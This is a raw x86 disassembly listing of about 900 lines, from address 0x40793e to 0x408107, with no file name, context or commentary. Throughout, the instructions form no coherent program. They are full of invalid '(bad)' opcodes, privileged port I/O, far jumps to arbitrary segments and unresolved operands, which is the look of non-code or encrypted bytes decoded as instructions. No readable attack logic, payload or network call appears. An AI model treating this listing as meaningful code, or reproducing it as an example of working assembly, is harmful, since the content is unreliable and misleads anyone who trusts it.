  40793e:	xchg   edi,eax
  40793f:	aaa    
  407940:	adc    eax,0x9e8d86c6
  407945:	sub    bh,BYTE PTR [ebx+0x45c86e9e]
  40794b:	jp     0x40795c
  40794d:	(bad)  
  40794e:	xor    DWORD PTR [ebx],ebx
  407950:	pop    eax
  407951:	mov    edx,ecx
  407953:	mov    cs:0x35c2bfb0,eax
  407959:	cs mov esp,0x7405002
  40795f:	not    edi
  407961:	mov    al,0x8e
  407963:	cmp    eax,0x42b1b123
  407968:	mov    ecx,ebx
  40796a:	aaa    
  40796b:	ror    ah,1
  40796d:	sbb    DWORD PTR [eax+0x2b],eax
  407970:	sub    BYTE PTR [ecx+0x179a7a41],dh
  407976:	les    esp,FWORD PTR [edi]
  407978:	cmp    ch,BYTE PTR [ecx-0x34]
  40797b:	jmp    0x6457:0xc7b4e252
  407982:	jns    0x4079be
  407984:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407985:	std    
  407986:	adc    eax,0xa25d9aa4
  40798b:	xor    edx,DWORD PTR [ecx]
  40798d:	aas    
  40798e:	xlat   BYTE PTR ds:[ebx]
  40798f:	jmp    0x40793b
  407991:	mov    WORD PTR ds:0xcb8dd655,?
  407997:	sub    BYTE PTR [ecx],cl
  407999:	mov    ah,0xa9
  40799b:	jne    0x407972
  40799d:	mov    DWORD PTR [ecx],edi
  40799f:	push   edi
  4079a0:	adc    eax,0x2815bbbb
  4079a5:	push   0x7
  4079a7:	lahf   
  4079a8:	mov    al,ds:0xaa389714
  4079ad:	jmp    0x407999
  4079af:	add    eax,0x10f4ac3f
  4079b4:	or     ebx,DWORD PTR [ecx+0x4c]
  4079b7:	clc    
  4079b8:	mov    edi,edx
  4079ba:	mov    cl,0x1f
  4079bc:	push   esp
  4079bd:	test   eax,0x6132907b
  4079c2:	jne    0x407996
  4079c4:	test   BYTE PTR [eax+0xd],dh
  4079c7:	mov    ?,WORD PTR ss:[edi-0x7c]
  4079cb:	jecxz  0x407a46
  4079cd:	add    ebp,esi
  4079cf:	repz imul eax,esp,0xfffffffd
  4079d3:	inc    ecx
  4079d4:	lods   al,BYTE PTR ds:[esi]
  4079d5:	lods   al,BYTE PTR ds:[esi]
  4079d6:	dec    edx
  4079d7:	cmp    esi,DWORD PTR [edi]
  4079d9:	cmc    
  4079da:	inc    edi
  4079db:	pop    ecx
  4079dc:	push   0x32
  4079de:	pop    ebx
  4079df:	shl    DWORD PTR [eax-0x5ba56f19],0x38
  4079e6:	fwait
  4079e7:	jno    0x407a20
  4079e9:	pushf  
  4079ea:	add    DWORD PTR [eax],edi
  4079ec:	aas    
  4079ed:	cmp    edi,DWORD PTR [edx+ebx*8-0x6579d47f]
  4079f4:	cmp    cl,BYTE PTR [ecx-0x51031d8c]
  4079fa:	and    DWORD PTR [edx+0x25cafc93],ebx
  407a00:	int3   
  407a01:	add    BYTE PTR [ebx],dh
  407a03:	mov    bh,0x8d
  407a05:	test   DWORD PTR [esi+0x65],edx
  407a08:	enter  0x1c18,0x3e
  407a0c:	in     eax,0x44
  407a0e:	mov    eax,0xc1c7c738
  407a13:	mov    al,0x79
  407a15:	call   0x929:0x88130e64
  407a1c:	push   ebp
  407a1d:	jmp    0x45d4cde8
  407a22:	(bad)  
  407a23:	or     BYTE PTR [ebp-0x5a],al
  407a26:	fidiv  WORD PTR [edx]
  407a28:	into   
  407a29:	(bad)
  407a2d:	test   BYTE PTR [esi+0x4d],bl
  407a30:	add    eax,esi
  407a32:	xchg   ebx,eax
  407a33:	sbb    bh,BYTE PTR ds:0x983cafad
  407a39:	fild   DWORD PTR [eax]
  407a3b:	idiv   DWORD PTR [ebp+0xf]
  407a3e:	out    dx,al
  407a3f:	dec    ecx
  407a40:	aaa    
  407a41:	sub    BYTE PTR ds:0x485d6a05,bl
  407a47:	fdivr  st,st(7)
  407a49:	adc    esi,eax
  407a4b:	mov    ah,0xf0
  407a4d:	jmp    0x4d390e93
  407a52:	arpl   WORD PTR [esi+0x1e],dx
  407a55:	mov    esp,ds
  407a57:	dec    edi
  407a58:	pop    ebp
  407a59:	mov    al,BYTE PTR [ecx+edx*1+0x154dfed5]
  407a60:	add    BYTE PTR [edi],bl
  407a62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a63:	cmp    ch,BYTE PTR [ebp-0x12]
  407a66:	nop
  407a67:	pop    ds
  407a68:	fucomip st,st(4)
  407a6a:	je     0x407a7d
  407a6c:	outs   dx,DWORD PTR ds:[esi]
  407a6d:	push   ebp
  407a6e:	jmp    0x407a03
  407a70:	and    DWORD PTR [ecx-0x5808d30d],ecx
  407a76:	call   DWORD PTR [ecx-0x36]
  407a79:	jne    0x407a64
  407a7b:	push   edx
  407a7c:	aaa    
  407a7d:	mov    ds:0x204486f3,eax
  407a82:	cmp    BYTE PTR [eax+0x74ed27a9],ch
  407a88:	push   0xffffff96
  407a8a:	sub    cl,BYTE PTR [ecx+edx*4]
  407a8d:	xchg   esi,eax
  407a8e:	in     eax,0xc6
  407a90:	xchg   ebx,eax
  407a91:	gs out 0x27,eax
  407a94:	das    
  407a95:	inc    edx
  407a96:	and    bh,ch
  407a98:	sub    al,0x76
  407a9a:	sub    dl,BYTE PTR [edi+0x5ce2d0aa]
  407aa0:	mov    dh,0x6c
  407aa2:	in     eax,dx
  407aa3:	sbb    dl,BYTE PTR [esp+edx*8-0x5e]
  407aa7:	(bad)  
  407aa8:	std    
  407aa9:	dec    esp
  407aaa:	cmovnp edi,DWORD PTR [edi+ecx*2-0x471b5144]
  407ab2:	lock clc 
  407ab4:	and    BYTE PTR [esi],ah
  407ab6:	dec    ebx
  407ab7:	ss inc edx
  407ab9:	push   edx
  407aba:	sub    al,0x4d
  407abc:	aam    0x9c
  407abe:	xchg   BYTE PTR [edi+esi*1],dl
  407ac1:	repz sbb BYTE PTR [esi+0x138c9b89],0xe8
  407ac9:	and    BYTE PTR [bp+di+0xb60],dl
  407ace:	sbb    BYTE PTR [eax],al
  407ad0:	stc    
  407ad1:	aad    0xd4
  407ad3:	hlt    
  407ad4:	xor    eax,0x783c2a01
  407ad9:	sar    DWORD PTR [ebp-0x64525c4a],1
  407adf:	inc    ecx
  407ae0:	mov    al,0x77
  407ae2:	iret   
  407ae3:	pop    edi
  407ae4:	push   esp
  407ae5:	ficom  DWORD PTR [edx]
  407ae7:	stc    
  407ae8:	or     ecx,DWORD PTR [ecx]
  407aea:	mov    al,0xc1
  407aec:	dec    edx
  407aed:	cld    
  407aee:	inc    edi
  407aef:	mov    cl,0x3c
  407af1:	dec    ecx
  407af2:	scas   al,BYTE PTR es:[edi]
  407af3:	out    0xf9,eax
  407af5:	loope  0x407ab4
  407af7:	cld    
  407af8:	or     DWORD PTR [ebx],edi
  407afa:	add    al,0xb5
  407afc:	jne    0x407b61
  407afe:	dec    ebp
  407aff:	fcom   DWORD PTR [ebx-0x583affa1]
  407b05:	test   DWORD PTR [esi+0x46629b66],eax
  407b0b:	jmp    FWORD PTR [ebx+0x3c]
  407b0e:	pop    esi
  407b0f:	out    0x26,al
  407b11:	cdq    
  407b12:	fs jb  0x407b81
  407b15:	push   es
  407b16:	repz sbb BYTE PTR [ecx+edi*1-0x424fef92],0x71
  407b1f:	out    dx,eax
  407b20:	mov    edx,0x8277ce22
  407b25:	stc    
  407b26:	jns    0x407b95
  407b28:	shr    BYTE PTR [ebp-0x5c43e482],1
  407b2e:	jp     0x407b63
  407b30:	pop    sp
  407b32:	jno    0x407b55
  407b34:	loope  0x407b1e
  407b36:	ins    BYTE PTR es:[edi],dx
  407b37:	xchg   ecx,eax
  407b38:	adc    edx,DWORD PTR [edi+0x1f]
  407b3b:	ds push ds
  407b3d:	fs push ss
  407b3f:	ror    BYTE PTR [edx],cl
  407b41:	dec    eax
  407b42:	mov    al,BYTE PTR [ebp-0xe]
  407b45:	lock repnz push ss
  407b48:	dec    esp
  407b49:	in     al,dx
  407b4a:	add    ebx,DWORD PTR [eax-0x3de7be3b]
  407b50:	pop    ecx
  407b51:	push   0x64
  407b53:	cmp    DWORD PTR [ebp-0x1f],ebx
  407b56:	and    bh,BYTE PTR [ebp+0x7d39ff3d]
  407b5c:	pushf  
  407b5d:	sar    DWORD PTR [ebx],1
  407b5f:	out    dx,al
  407b60:	shr    DWORD PTR [edx-0x6fb0e11e],cl
  407b66:	jmp    0x407b3d
  407b68:	xchg   BYTE PTR [esp+ebx*4-0x20],dl
  407b6c:	iret   
  407b6d:	loopne 0x407afd
  407b6f:	xor    BYTE PTR [ecx+0x26],0x6d
  407b73:	and    eax,0xf1695114
  407b78:	inc    ebp
  407b79:	jp     0x407b60
  407b7b:	xor    BYTE PTR [ecx-0x9],ah
  407b7e:	lock movs DWORD PTR es:[edi],DWORD PTR fs:[esi]
  407b81:	push   ss
  407b82:	sbb    BYTE PTR [edx+0x5f],ch
  407b85:	es scas eax,DWORD PTR es:[edi]
  407b87:	mov    al,0x95
  407b89:	adc    esi,DWORD PTR [ebx]
  407b8b:	add    bh,BYTE PTR [ecx+0x55]
  407b8e:	(bad)  
  407b8f:	loopne 0x407b50
  407b91:	mov    BYTE PTR [ebp-0x7f],ch
  407b94:	repnz fdiv QWORD PTR [edx]
  407b97:	mov    cl,0xe7
  407b99:	push   ebp
  407b9a:	pushf  
  407b9b:	adc    DWORD PTR [eax],esi
  407b9d:	fld    QWORD PTR [ebx]
  407b9f:	and    BYTE PTR [edx-0x7c573efa],al
  407ba5:	fidiv  DWORD PTR [ebx]
  407ba7:	push   cs
  407ba8:	test   eax,0x94c8b452
  407bad:	jnp    0x407b97
  407baf:	cmp    cl,BYTE PTR [eax]
  407bb1:	cld    
  407bb2:	xor    al,bl
  407bb4:	add    dl,BYTE PTR [ecx]
  407bb6:	aad    0x8e
  407bb8:	jmp    0x3b3a8f8b
  407bbd:	mov    al,ds:0x4c2733ab
  407bc2:	and    esi,DWORD PTR [ecx+eax*8+0x655367de]
  407bc9:	jns    0x407bb8
  407bcb:	inc    ebp
  407bcc:	pop    ds
  407bcd:	enter  0x90bb,0x95
  407bd1:	int    0x65
  407bd3:	jae    0x407c15
  407bd5:	dec    esp
  407bd6:	repnz icebp 
  407bd8:	or     eax,0x543ff30f
  407bdd:	dec    edx
  407bde:	mov    eax,0x73eee0bd
  407be3:	in     al,0x10
  407be5:	sbb    ecx,DWORD PTR [ebp+0x76]
  407be8:	or     DWORD PTR [edx],edx
  407bea:	cmp    dl,BYTE PTR [edi+0x0]
  407bed:	inc    esp
  407bee:	outs   dx,BYTE PTR ds:[esi]
  407bef:	rol    cl,cl
  407bf1:	and    al,0x5c
  407bf3:	jne    0x407bf7
  407bf5:	(bad)  
  407bf6:	dec    edx
  407bf7:	aad    0x9
  407bf9:	or     ah,BYTE PTR [esi+0x4e3d3c31]
  407bff:	clc    
  407c00:	xchg   ebx,eax
  407c01:	mov    edi,0x226d065b
  407c06:	push   cs
  407c07:	pop    es
  407c08:	repz into 
  407c0a:	(bad)  
  407c0b:	mov    bl,0xa5
  407c0d:	inc    edi
  407c0e:	pop    esi
  407c0f:	jns    0x407bbe
  407c11:	pusha  
  407c12:	xchg   DWORD PTR [ecx+0x67],eax
  407c15:	xchg   BYTE PTR [edi+0x1a4f003a],ah
  407c1b:	shr    BYTE PTR [eax],0x97
  407c1e:	sar    ebp,1
  407c20:	scas   al,BYTE PTR es:[edi]
  407c21:	aam    0x33
  407c23:	sbb    DWORD PTR [ebp+ebx*2+0x6d],0xffffffc8
  407c28:	in     eax,dx
  407c29:	outs   dx,DWORD PTR ds:[esi]
  407c2a:	or     cl,0xf1
  407c2d:	in     eax,0x4
  407c2f:	sbb    al,0x66
  407c31:	outs   dx,BYTE PTR ds:[esi]
  407c32:	in     eax,0xbb
  407c34:	mov    edx,0xbfd955b8
  407c39:	push   ebx
  407c3a:	mov    ds:0x1f5a6043,al
  407c3f:	cmp    al,0x79
  407c41:	lods   eax,DWORD PTR ds:[esi]
  407c42:	jne    0x407be0
  407c44:	pop    ss
  407c45:	push   ebx
  407c46:	add    ch,bl
  407c48:	scas   al,BYTE PTR es:[edi]
  407c49:	sti    
  407c4a:	jmp    0x407c19
  407c4c:	mov    ah,0xfc
  407c4e:	mov    edi,0xbd956967
  407c53:	ja     0x407c4b
  407c55:	aas    
  407c56:	sub    BYTE PTR [edi+eax*2+0x1e],dl
  407c5a:	pop    eax
  407c5b:	cmp    edi,esp
  407c5d:	rol    BYTE PTR [ebx-0x9],1
  407c60:	or     BYTE PTR [ebp+edi*4+0x3fc2dcc7],dh
  407c67:	js     0x407ca3
  407c69:	aad    0xc4
  407c6b:	xor    DWORD PTR [ebx],eax
  407c6d:	mov    bl,BYTE PTR [ebp+eiz*2-0x12375b8d]
  407c74:	xchg   esi,eax
  407c75:	(bad)  [edx]
  407c77:	adc    al,0xff
  407c79:	outs   dx,BYTE PTR ds:[esi]
  407c7a:	mov    edi,0x1b136c8b
  407c7f:	pop    esp
  407c80:	nop
  407c81:	sub    eax,0x5b0906
  407c86:	scas   eax,DWORD PTR es:[edi]
  407c87:	sbb    ebx,DWORD PTR [ebx]
  407c89:	pop    esi
  407c8a:	or     al,0x33
  407c8c:	push   esi
  407c8d:	mov    WORD PTR [edx-0x38],?
  407c90:	das    
  407c91:	jo     0x407c58
  407c93:	pop    ebx
  407c94:	in     al,0xa9
  407c96:	jle    0x407cbb
  407c98:	or     eax,0xd1fb453e
  407c9d:	inc    edi
  407c9e:	imul   BYTE PTR [edi+ecx*8-0x65813a37]
  407ca5:	xor    BYTE PTR [esi-0x2e9e4b03],ah
  407cab:	pop    ebp
  407cac:	and    eax,DWORD PTR [esi+eiz*1+0x1aa7b60f]
  407cb3:	jmp    0xf74682ec
  407cb8:	jp     0x407d27
  407cba:	mov    dh,0xbb
  407cbc:	sub    ah,BYTE PTR [ecx-0x65719b58]
  407cc2:	xchg   ebx,eax
  407cc3:	std    
  407cc4:	daa    
  407cc5:	add    BYTE PTR [ecx],bh
  407cc7:	sub    eax,0xc6dd5901
  407ccc:	je     0x407d4c
  407cce:	push   esp
  407ccf:	mov    esi,0xba0b286f
  407cd4:	jge    0x407cbb
  407cd6:	push   esp
  407cd7:	das    
  407cd8:	and    ah,BYTE PTR [esi+0x32f9bfee]
  407cde:	into   
  407cdf:	sbb    ebx,DWORD PTR [ebp+0x38]
  407ce2:	add    ah,ch
  407ce4:	or     bh,0xaf
  407ce7:	arpl   WORD PTR [ebx+0x58105d8],cx
  407ced:	xor    BYTE PTR [ecx+0x79ef4236],bh
  407cf3:	or     dl,BYTE PTR [edx-0x43]
  407cf6:	in     al,dx
  407cf7:	js     0x407cc1
  407cf9:	mov    DWORD PTR [ebx+ebx*2+0x5d70ee42],edx
  407d00:	mov    dl,0xbf
  407d02:	pop    ebp
  407d03:	fidivr WORD PTR [ecx-0x6df674cc]
  407d09:	xor    DWORD PTR [esi],eax
  407d0b:	out    dx,eax
  407d0c:	and    al,0x20
  407d0e:	mov    dl,0xf5
  407d10:	jmp    0xfc92d621
  407d15:	lods   al,BYTE PTR ss:[esi]
  407d17:	adc    DWORD PTR [esi+ecx*2+0x305da123],esp
  407d1e:	dec    esp
  407d1f:	add    al,0x46
  407d21:	add    al,0x14
  407d23:	xchg   esp,eax
  407d24:	fdiv   st,st(3)
  407d26:	mov    al,ds:0xaf170d98
  407d2b:	inc    eax
  407d2c:	jle    0x407cd2
  407d2e:	xchg   edi,eax
  407d2f:	jecxz  0x407cd0
  407d31:	xlat   BYTE PTR ds:[ebx]
  407d32:	sub    cl,BYTE PTR [edi-0x41b92650]
  407d38:	mov    dh,0x40
  407d3a:	xchg   DWORD PTR [ecx+0x4660afb3],esp
  407d40:	loopne 0x407d46
  407d42:	xor    DWORD PTR [ecx+0x2fa0fd67],esp
  407d48:	scas   al,BYTE PTR es:[edi]
  407d49:	jmp    0x407d30
  407d4b:	stc    
  407d4c:	test   eax,0x4ea60e5b
  407d51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d52:	mov    al,ds:0xe0732dda
  407d57:	or     bl,BYTE PTR [eax]
  407d59:	shr    BYTE PTR [ebp+0x678c784a],cl
  407d5f:	sbb    bl,dl
  407d61:	xchg   esi,eax
  407d62:	xchg   ecx,eax
  407d63:	dec    eax
  407d64:	gs (bad) 
  407d67:	fsub   st(4),st
  407d69:	into   
  407d6a:	mov    fs,WORD PTR [eax-0x316921f7]
  407d70:	mov    bl,0x21
  407d72:	cmp    ebp,DWORD PTR [edx+0x1b92b319]
  407d78:	out    dx,al
  407d79:	cmp    ebx,0xffffffd3
  407d7c:	xor    eax,DWORD PTR [ecx+0x66]
  407d7f:	test   BYTE PTR [ecx],0xca
  407d82:	fimul  WORD PTR [ecx]
  407d84:	pop    edi
  407d85:	jbe    0x407d7a
  407d87:	dec    edx
  407d88:	sub    BYTE PTR [ebp-0x6baee37d],0xa2
  407d8f:	add    BYTE PTR [eax],0x16
  407d92:	not    DWORD PTR [ebx+0x569de914]
  407d98:	fild   WORD PTR [esi]
  407d9b:	lods   al,BYTE PTR ds:[esi]
  407d9c:	fdivrp st(0),st
  407d9e:	jl     0x407d8c
  407da0:	loop   0x407d8f
  407da2:	inc    ebx
  407da3:	pop    DWORD PTR [edi]
  407da5:	in     eax,dx
  407da6:	retf   0x5860
  407da9:	rol    BYTE PTR [eax],1
  407dab:	cs dec eax
  407dad:	add    ah,cl
  407daf:	pop    ebp
  407db0:	in     eax,0x54
  407db2:	sub    al,0x82
  407db4:	out    0x90,al
  407db6:	nop
  407db7:	lahf   
  407db8:	cmp    ah,BYTE PTR [ebx-0x52e565d3]
  407dbe:	add    DWORD PTR [ebx],esi
  407dc0:	jno    0x407da6
  407dc2:	add    esi,ebp
  407dc4:	adc    eax,0x451f8b12
  407dc9:	ret    
  407dca:	push   ebp
  407dcc:	or     esp,DWORD PTR [eax+edi*2]
  407dcf:	mov    cl,0xa0
  407dd1:	mov    WORD PTR [esi+esi*8+0x7d7e2f7b],ds
  407dd8:	sbb    ch,bl
  407dda:	int    0xc9
  407ddc:	enter  0x8ee3,0x8d
  407de0:	test   DWORD PTR [ecx+0x63],eax
  407de3:	push   0xffffff96
  407de5:	(bad)  
  407de6:	gs mov ch,al
  407de9:	or     eax,0xebddfac1
  407dee:	xchg   esp,eax
  407df0:	ins    DWORD PTR es:[edi],dx
  407df1:	xchg   esi,eax
  407df2:	rcr    DWORD PTR [ebp+0x37],0x24
  407df6:	jnp    0x407e75
  407df8:	ins    BYTE PTR es:[edi],dx
  407df9:	jg     0x407e54
  407dfb:	pop    edx
  407dfc:	mul    ebp
  407dfe:	out    0xfa,al
  407e00:	add    BYTE PTR [ebp+0x39],bh
  407e03:	cwde   
  407e04:	stos   DWORD PTR es:[edi],eax
  407e05:	pushf  
  407e06:	pop    edi
  407e07:	mov    al,0xb4
  407e09:	xchg   edx,eax
  407e0a:	gs jae 0x407e23
  407e0d:	jo     0x407dd9
  407e0f:	rol    bh,1
  407e11:	dec    esi
  407e12:	aas    
  407e13:	sbb    BYTE PTR [edi],0x1f
  407e16:	mov    dh,0xb0
  407e18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e19:	push   ebx
  407e1a:	mov    ds:0x597a6b36,al
  407e1f:	daa    
  407e20:	dec    ebx
  407e21:	lahf   
  407e22:	stos   DWORD PTR es:[edi],eax
  407e23:	lods   al,BYTE PTR ds:[esi]
  407e24:	shr    BYTE PTR [esi+0x5f],0x4e
  407e28:	mov    BYTE PTR [edi-0x59de7641],cl
  407e2e:	sahf   
  407e2f:	xor    bl,BYTE PTR [esp+ecx*8-0x1dd874e]
  407e36:	add    dl,BYTE PTR [edi]
  407e38:	mov    ecx,0xb0d0c33f
  407e3d:	and    eax,DWORD PTR [ebx-0x5b]
  407e40:	aam    0xd1
  407e42:	mov    cl,0x7b
  407e44:	sti    
  407e45:	push   edx
  407e46:	sahf   
  407e47:	clc    
  407e48:	dec    ebp
  407e49:	push   es
  407e4a:	and    eax,0x2f611cf8
  407e4f:	test   DWORD PTR [ebp+0x5a],0xcc8dbdea
  407e56:	xchg   esp,eax
  407e57:	inc    ebp
  407e58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e59:	cmp    eax,0x42f53c13
  407e5e:	or     ah,BYTE PTR [edi+0x69]
  407e61:	test   DWORD PTR [esi],edi
  407e63:	jp     0x407ee0
  407e65:	xchg   ebp,eax
  407e66:	xchg   edi,eax
  407e67:	mov    ebp,0x99137257
  407e6c:	int3   
  407e6d:	in     eax,dx
  407e6e:	es inc ebp
  407e70:	ss cmp eax,0x7db05852
  407e76:	in     eax,dx
  407e77:	cdq    
  407e78:	pop    ecx
  407e79:	iret   
  407e7a:	sbb    eax,0xe635abe7
  407e7f:	mov    esi,0xe99e1564
  407e84:	sbb    ecx,0xfea00f73
  407e8a:	jno    0x407eab
  407e8c:	inc    eax
  407e8d:	pushf  
  407e8e:	add    ebx,DWORD PTR [ebp+0x14fde3e5]
  407e94:	aad    0x50
  407e96:	or     edi,DWORD PTR [ecx+0x40]
  407e99:	mov    esi,0x88f7162e
  407e9e:	mov    esp,0x8487998b
  407ea3:	push   esi
  407ea4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ea5:	xchg   BYTE PTR [edx+eax*1-0x21ef9234],al
  407eac:	lock xor eax,0x37f9600d
  407eb2:	out    dx,al
  407eb3:	mov    edi,edx
  407eb5:	in     eax,0xb9
  407eb7:	js     0x407ed7
  407eb9:	data16 fild QWORD PTR [edx]
  407ebc:	add    bl,dl
  407ebe:	adc    cl,BYTE PTR ds:0xe6cc7922
  407ec4:	arpl   WORD PTR [esi+0x28],si
  407ec7:	push   ebx
  407ec8:	push   esi
  407ec9:	sub    bl,BYTE PTR [ecx+esi*2-0x77]
  407ecd:	adc    esp,DWORD PTR [ecx+0x4e]
  407ed0:	pop    esp
  407ed1:	popf   
  407ed2:	ss push 0x1aa64174
  407ed8:	shl    DWORD PTR [ebp+0x75ebec85],1
  407ede:	xacquire xchg BYTE PTR [eax],bl
  407ee1:	into   
  407ee2:	mov    edi,0xac0f99d3
  407ee7:	out    dx,eax
  407ee8:	(bad)  
  407ee9:	mov    dh,0xc
  407eeb:	jbe    0x407ec3
  407eed:	mov    ebp,0x6c2231e6
  407ef2:	jmp    0xe469:0xbf7ac8a4
  407ef9:	mov    ecx,0x8a5fcdc2
  407efe:	ret    
  407eff:	mov    bh,0x29
  407f01:	mov    WORD PTR [ecx-0x3a93aa1b],?
  407f07:	fs or  eax,0xb78e9635
  407f0d:	ins    DWORD PTR es:[edi],dx
  407f0e:	test   eax,0xff6fc998
  407f13:	fldcw  WORD PTR [edx]
  407f15:	arpl   WORD PTR [edx+edx*2+0x3a81dbad],bx
  407f1c:	jp     0x407f34
  407f1e:	dec    esi
  407f1f:	mov    ebp,0x7aa7953a
  407f24:	or     eax,0x77fccfb4
  407f29:	ret    0xc9c0
  407f2c:	adc    esp,0xfffffff1
  407f2f:	fwait
  407f30:	in     al,0x54
  407f32:	mov    BYTE PTR [ebx],cl
  407f34:	push   eax
  407f35:	inc    ecx
  407f36:	aas    
  407f37:	inc    edx
  407f38:	pop    edi
  407f39:	jmp    0x6275cdea
  407f3e:	xchg   esi,eax
  407f3f:	js     0x407f8b
  407f41:	out    0xac,al
  407f43:	add    al,0x96
  407f45:	cdq    
  407f46:	fist   WORD PTR [edi+0x3e]
  407f49:	not    ch
  407f4b:	ss out dx,al
  407f4d:	into   
  407f4e:	pop    edi
  407f4f:	and    DWORD PTR [esi+0x2e7c7f99],ebx
  407f55:	repnz inc ebp
  407f57:	xchg   ebx,eax
  407f58:	dec    ecx
  407f59:	dec    ebx
  407f5a:	cdq    
  407f5b:	xor    BYTE PTR [edi-0x47],dh
  407f5e:	ja     0x407f3c
  407f60:	jg     0x407fd9
  407f62:	loop   0x407f59
  407f64:	and    ch,0x2d
  407f67:	mov    bl,0xd1
  407f69:	imul   DWORD PTR [esi-0x28663e66]
  407f6f:	mov    ch,0x40
  407f71:	ret    0xecf3
  407f74:	mov    ecx,0x97baee58
  407f79:	cs into 
  407f7b:	push   edx
  407f7c:	scas   eax,DWORD PTR es:[edi]
  407f7d:	fwait
  407f7e:	cmp    esi,DWORD PTR [eax]
  407f80:	or     BYTE PTR [ebx+ebx*1+0x7e],0x7b
  407f85:	mov    eax,ds:0xa6dc580b
  407f8a:	sub    eax,0x7ebdd3f4
  407f8f:	mov    eax,0x6d474061
  407f94:	jnp    0x407feb
  407f96:	mov    ecx,ebx
  407f98:	push   eax
  407f99:	push   0xd284e1b4
  407f9e:	pusha  
  407f9f:	jl     0x407f79
  407fa1:	rcl    DWORD PTR [esi-0x22],0x60
  407fa5:	add    BYTE PTR [edi+0x59],0x77
  407fa9:	add    cl,BYTE PTR [ebp+0x8]
  407fac:	and    edi,DWORD PTR [eax]
  407fae:	aaa    
  407faf:	sub    eax,0xbf178854
  407fb4:	retf   0xb3eb
  407fb7:	and    WORD PTR [edi+0x57b956a7],sp
  407fbe:	sahf   
  407fbf:	in     eax,dx
  407fc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fc1:	icebp  
  407fc2:	inc    ecx
  407fc3:	add    ch,ah
  407fc5:	add    DWORD PTR [edi],edx
  407fc7:	dec    ebp
  407fc8:	push   esp
  407fc9:	in     eax,dx
  407fca:	retf   0xf1b1
  407fcd:	test   DWORD PTR [ecx-0x11d5a1e0],0xa347b6de
  407fd7:	mov    ebx,0x6eea3c9d
  407fdc:	lds    edx,FWORD PTR [ebp-0x746a9640]
  407fe2:	cmp    ebx,esi
  407fe4:	mov    gs,esi
  407fe6:	shr    edx,0x92
  407fe9:	xchg   ecx,eax
  407fea:	pop    edx
  407feb:	cld    
  407fec:	xchg   ecx,eax
  407fed:	jno    0x407fd8
  407fef:	inc    edx
  407ff0:	cmp    eax,0xb5923eea
  407ff5:	pop    esi
  407ff6:	mov    eax,ds:0x1e8b6f4d
  407ffb:	test   BYTE PTR [ecx+0x6b],ah
  407ffe:	lsl    ecx,WORD PTR [ebx+0x54]
  408002:	(bad)  
  408003:	ss sti 
  408005:	mov    ch,0x99
  408007:	mov    cs,ecx
  408009:	stos   BYTE PTR es:[edi],al
  40800a:	icebp  
  40800b:	jl     0x408021
  40800d:	cmc    
  40800e:	lea    ebx,[esi-0x38]
  408011:	das    
  408012:	retf   0x5c0c
  408015:	and    DWORD PTR [ebp-0x5356a080],esp
  40801b:	nop
  40801c:	ja     0x408078
  40801e:	aad    0x64
  408020:	lods   eax,DWORD PTR ds:[esi]
  408021:	imul   ecx,DWORD PTR [edx-0x32],0xad0913a5
  408028:	test   BYTE PTR [ebx+0x46aec949],bh
  40802e:	bound  eax,QWORD PTR [edi]
  408030:	sbb    DWORD PTR [esp+eiz*4-0x5da31312],ebx
  408037:	adc    ch,BYTE PTR [eax-0x274fc475]
  40803d:	cli    
  40803e:	jl     0x408020
  408040:	dec    eax
  408041:	inc    edi
  408042:	push   ebx
  408043:	jb     0x407fe4
  408045:	push   cs
  408046:	imul   ebp,esi,0xbe7dbaf9
  40804c:	(bad)  
  40804d:	jecxz  0x4080c7
  40804f:	jbe    0x408025
  408051:	mov    ecx,0x5d104634
  408056:	mov    esi,0x920f99c2
  40805b:	data16 in al,0xb3
  40805e:	js     0x408077
  408060:	pop    edx
  408061:	mov    cl,0x9c
  408063:	or     DWORD PTR [edx-0x70],ebx
  408066:	mov    ah,0x25
  408068:	int    0xa8
  40806a:	pop    esi
  40806b:	mov    ebx,0x406289d8
  408070:	pop    ebp
  408071:	pushf  
  408072:	stos   DWORD PTR es:[edi],eax
  408073:	fisub  DWORD PTR [edi-0x59d295f8]
  408079:	sbb    ecx,ebp
  40807b:	ror    ebx,1
  40807d:	(bad)  
  40807e:	das    
  40807f:	pop    esi
  408080:	add    dh,al
  408082:	jle    0x408058
  408084:	sti    
  408085:	mov    ebx,0x998efcbb
  40808a:	icebp  
  40808b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40808c:	mov    edx,0x1aa31f58
  408091:	cmc    
  408092:	push   eax
  408093:	mov    cl,0x37
  408095:	out    0xae,eax
  408097:	test   eax,0xac2c9721
  40809c:	mov    cl,0x59
  40809e:	les    esi,FWORD PTR [esi+0x3b9d1080]
  4080a4:	loop   0x4080f8
  4080a6:	add    al,0x81
  4080a8:	dec    edx
  4080a9:	shl    DWORD PTR [edi+eiz*2+0xa],0x29
  4080ae:	xor    bl,ah
  4080b0:	dec    edx
  4080b1:	xchg   esp,eax
  4080b2:	or     al,0x6
  4080b4:	fisubr WORD PTR [edi+eiz*1-0x32]
  4080b8:	or     DWORD PTR [ebx+0x6ecc69d2],esi
  4080be:	sbb    dl,0x26
  4080c1:	mov    dl,0xca
  4080c3:	int3   
  4080c4:	mov    esp,0x4cacb5c0
  4080c9:	inc    eax
  4080ca:	ds cli 
  4080cc:	sub    al,0xef
  4080ce:	sub    al,0x74
  4080d0:	enter  0x4a48,0x7d
  4080d4:	test   al,0xf7
  4080d6:	adc    cl,bh
  4080d8:	push   edi
  4080d9:	dec    eax
  4080da:	bound  edi,QWORD PTR [esp+ecx*2-0x1a]
  4080de:	test   ecx,esp
  4080e0:	adc    al,0xb3
  4080e2:	in     eax,dx
  4080e3:	call   0x889f0289
  4080e8:	sahf   
  4080e9:	mov    ecx,0xf344497
  4080ee:	stos   BYTE PTR es:[edi],al
  4080ef:	lahf   
  4080f0:	mov    esi,0x499e0fdf
  4080f5:	xchg   esp,eax
  4080f6:	mov    ebx,0xcd6875cd
  4080fb:	(bad)  
  4080fc:	cli    
  4080fd:	int    0x18
  4080ff:	inc    edx
  408100:	adc    eax,0x5743ec4f
  408105:	push   ebp
  408106:	(bad)  
  408107:	push   ss
